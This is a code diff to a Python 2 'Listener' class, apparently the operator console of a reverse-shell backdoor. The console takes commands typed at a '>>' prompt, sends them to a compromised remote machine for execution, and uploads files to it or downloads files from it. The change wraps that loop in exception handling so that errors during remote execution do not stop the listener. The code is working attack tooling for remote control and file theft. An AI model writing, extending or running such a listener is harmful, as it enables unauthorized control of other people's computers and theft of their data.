@@ -5,7 +5,6 @@ import socket
 import json
 import base64
 
-
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -49,15 +48,19 @@ class Listener:
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
-            if command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                    
+                result = self.execute_remotely(command)
                 
-            result = self.execute_remotely(command)
-            
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
-               
+                if command[0] == "download" and "[-] Error" not in result:
+                    result = self.write_file(command[1], result)
+
+            except Exception:
+                result = "[-] Error during command execution"
+
             print(result)
 
 
